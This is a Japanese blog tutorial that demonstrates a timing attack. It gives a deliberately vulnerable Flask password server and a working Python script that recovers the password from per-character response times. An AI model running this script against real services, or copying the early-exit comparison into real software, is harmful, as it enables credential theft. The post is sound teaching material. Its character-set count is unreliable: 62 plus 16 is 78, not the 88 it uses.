---
title: "タイミング攻撃の実践"
description: "タイミング攻撃を実際にやってみます"
tags: ["security"]
pubDate: '2024-11-01'
---

> [!caution]
> ここで得た知識を悪用することを禁じます。他者のシステム等に攻撃を行うことは犯罪になるので絶対にやめてください。

最近神戸で開催されたCSS2024に参加してきました。神戸はおしゃれな街でした。お土産に買って帰ったチーズケーキがものすごくおいしかったです。

さて、唐突ですが、ユーザが入力した文字列とサーバーに保存されているパスワードが一致しているかを調べるアルゴリズムを考えます。

以下の実装のうち、どちらが優れているでしょうか？

```c
for (int i = 0; i < 32; i++) {
    if (user_input[i] != password[i]) {
        return false;
    }
}
```

```c
bool flag = true;
for (int i = 0; i < 32; i++) {
    if (user_input[i] != password[i]) {
        flag = false
    }
}
return flag
```

前者は入力された文字列とパスワードが一致していないと分かった時点で処理を中断し、結果を返しています。

後者は入力された文字列とパスワードが一致していないことが途中で分かったとして、とりあえず最後まで比較を行って、すべての文字の比較が終わったあとに結果を返すようになっています。

一見すると、前者の方がすっきりしており、なおかつ平均的な実行時間も短く済むので優れていそうですが、セキュリティの面から見るとそうではありません。

このような実装をしてしまうと、**タイミング攻撃** の標的になってしまう可能性があります。



## タイミング攻撃とは

Wikipediaでは以下のように説明があります。

> **タイミング攻撃**（タイミングこうげき、英:timing attack）とは、[アルゴリズム](https://ja.wikipedia.org/wiki/アルゴリズム)の動作特性を利用した[サイドチャネル攻撃](https://ja.wikipedia.org/wiki/サイドチャネル攻撃)のひとつ。暗号処理のタイミングが[暗号鍵](https://ja.wikipedia.org/wiki/鍵_(暗号))の論理値により変化することに着目し、暗号化や復号に要する時間を解析することで暗号鍵を推定する手法 [Wikipedia]

先のパスワード認証システムの例を考えてみると、サーバはユーザの入力が間違っていると分かった時点で処理を中断するため処理時間が短くなり、ユーザが正しい情報を入力している際には最後まで処理が行われるので処理時間が長くなることになります。

具体例として、1文字を比較するのに1秒かかるシステムを考えます（そんなシステムあってたまるものかという突っ込みは置いといて）。パスワードが`abcd1234` の8文字だとして、ユーザが `abcD0987` と入力したとします。

システムは先頭から文字を比較し、4文字目の`D` でパスワードが誤っていると判断し処理を中断します。こうすると4秒で処理が返ってくるので、**3文字目までは合っている**という情報を漏らしてしまうことになるのです。

このように、**入力の値によって全体の処理の時間が変わってしまうシステムに対し、さまざまな入力を与えたときの実行時間を解析することでパスワードや暗号鍵等を不正に推測しようとする攻撃をタイミング攻撃**といいます。



## タイミング攻撃を実装してみる

パスワード認証を行う簡易サーバを立ててみて、それに対してタイミング攻撃を行ってみます。

タイミング攻撃を行いやすいように、サーバ側の処理はあえて脆弱なものにしておきます。

サーバ側処理の概要は以下の通りです。

1. 最初に英数字+記号を使った32文字のパスワードを1つ生成する
2. POSTでユーザからのリクエストを受け取る
3. ユーザの入力文字とパスワードの長さが一致していない場合、即座にFalseをレスポンスする
4. 1文字の比較には5msかかるとし、先頭からパスワードを比較したのち、不一致が分かった時点でFalseをレスポンスする
5. パスワードが一致していた場合はTrueをレスポンスする

```python
from flask import Flask, request, jsonify
import time
import random
import string

app = Flask(__name__)

# Generate a random password
symbols = "!@#$%&*+-=()[]{}"
PASSWORD = ''.join(random.choice(string.ascii_letters + string.digits + symbols) for _ in range(32))
print(f"Generated Password: {PASSWORD}")

@app.route("/auth_password", methods=["POST"])
def auth_password():
    user_input = request.json.get("password", "")

    print(f"Received: {user_input}")

    # compare length
    if len(user_input) != len(PASSWORD):
        return jsonify({"result": False})

    # compare each character
    for i in range(len(PASSWORD)):
        time.sleep(0.005)  # wait 5ms
        if PASSWORD[i] != user_input[i]:
            return jsonify({"result": False})

    # correct password
    return jsonify({"result": True})

if __name__ == "__main__":
    app.run(port=5000)

```



このサーバに対して、タイミング攻撃をしてみます。タイミング攻撃を行うスクリプトは以下の動作をします。

1. いろいろな長さの文字列(`AAAA...`)をリクエストしてみて、一番処理時間が長かったものをパスワードの長さと判断する
2. 先頭1文字を総当たりでリクエストを投げ、もっとも処理時間が長かったもの（すわなち比較が2文字目まで進んだもの）をパスワードの1文字目として決定する
3. 2の操作を1で判明したパスワードの長さ分繰り返す

```python
import requests
import time
import string

# Target Server
TARGET_URL = "http://localhost:5000/auth_password"
symbols = "!@#$%&*+-=()[]{}"
CHARACTER_SET = string.ascii_letters + string.digits + symbols

def find_password_length(max_length=64):
    max_time = 0
    correct_length = 0

    for length in range(1, max_length + 1):
        attempt = "A" * length

        start_time = time.time()
        response = requests.post(TARGET_URL, json={"password": attempt})
        elapsed_time = time.time() - start_time

        print(f"Length {length}: {elapsed_time:.4f} seconds")

        if elapsed_time > max_time:
            max_time = elapsed_time
            correct_length = length

    print(f"\x1b[32m[Done] length {correct_length}: {max_time}\x1b[0m")
    print(f"Guessed password length: {correct_length}")
    return correct_length

def timing_attack():
    password_length = find_password_length()
    guessed_password = ""

    for _ in range(password_length):
        max_time = 0
        correct_char = None

        for char in CHARACTER_SET:
            attempt = guessed_password + char
            padding = "A" * (password_length - len(attempt))
            attempt += padding

            print(f"\rTrying: \x1b[33m{guessed_password}\x1b[31m{char}\x1b[0m{padding}", end="")

            start_time = time.time()

            response = requests.post(TARGET_URL, json={"password": attempt})
            elapsed_time = time.time() - start_time

            if response.json().get("result", False):
                print("\r\x1b[2K", end="")
                return attempt

            if elapsed_time > max_time:
                max_time = elapsed_time
                correct_char = char

        guessed_password += correct_char


    print("\r\x1b[2K", end="")
    return guessed_password

if __name__ == "__main__":
    print("Start timing attack...")
    start_time = time.time()
    final_password = timing_attack()
    elapsed_time = time.time() - start_time
    print(f"\nFinal password: {final_password}")
    print(f"Elapsed time: {elapsed_time}")

```

実際に動かしてみます。

サーバーを動かした時

![image](/images/timing-attack/1.png)

タイミング攻撃の途中

![image](/images/timing-attack/2.png)

タイミング攻撃終了

![image](/images/timing-attack/3.png)

大体3分しないくらいで解析できていることが確認できます。

うまく動かない人は、1文字あたりの比較時間を5msから増やしてみてください。

## 計算量のはなし

パスワードを総当たりで調べる場合、使える文字種を$x$, パスワードの長さを$y$とするとき、最悪試行回数は
$$
x^y
$$
となり指数的に増加します。

今回の場合を考えると、文字種は英数字(62種類) + 記号(16種類)、パスワード長は32文字なので、
$$
88^{32} =167280573527068721679234551891969050043521640994714364942483456
$$
通りとなります。

通常のPCで解析を行うとすれば、1秒間に$10^9$(10億)回処理できるとしても、$5.3 \times 10^{45}$ 年だけかかることになります。宇宙の寿命を遙かに超える膨大な時間なので、現実的には解析不可能です。

一方で、タイミング攻撃が成功してしまう場合、88通りを調べれば1文字目が判明し、さらに88通り調べれば2文字目が判明し...とどんどん解析が可能になります。

つまり、$ 88 \times 32 = 2816 $ 通りだけ調べればよいことになります。

タイミング攻撃がどれだけ実用的で、怖いものかが実感できますね...

コンパイラの最適化等によってタイミング攻撃の脆弱性を生み出してしまう場合もあるようなので、注意が必要です。

## 注意

> [!caution]
> 再度注意ですが、これらの攻撃を他者のシステムに対して行うと犯罪になりますので、絶対に行わないでください。
